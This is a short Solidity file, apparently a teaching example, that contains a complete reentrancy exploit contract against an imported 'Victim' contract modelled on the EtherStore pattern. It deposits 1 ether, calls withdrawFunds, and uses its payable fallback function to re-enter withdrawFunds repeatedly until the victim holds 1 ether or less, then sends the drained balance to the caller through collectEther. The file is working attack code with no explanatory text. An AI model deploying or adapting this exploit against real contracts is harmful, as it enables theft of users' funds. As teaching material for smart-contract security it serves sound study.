pragma solidity ^0.4.22;

import './Victim.sol';

contract Attack {
  Victim public victim;
  uint public bal;

  // initialise the victim variable with the contract address
  constructor(address _VictimAddress) {
      victim = Victim(_VictimAddress);
      bal = victim.balance;
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      victim.depositFunds.value(1 ether)();
      // start the magic
      victim.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (victim.balance > 1 ether) {
          victim.withdrawFunds(1 ether);
      }
  }
}